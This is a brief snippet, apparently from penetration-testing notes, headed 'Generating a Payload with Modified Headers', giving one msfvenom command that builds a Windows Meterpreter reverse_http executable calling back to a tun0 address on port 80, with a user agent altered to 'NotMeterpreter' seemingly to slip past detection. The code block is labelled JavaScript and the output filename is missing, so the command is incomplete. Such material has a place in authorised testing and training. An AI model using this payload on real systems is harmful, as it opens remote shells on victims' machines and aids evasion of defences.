**Generating a Payload with Modified Headers**
```JavaScript
msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o
```
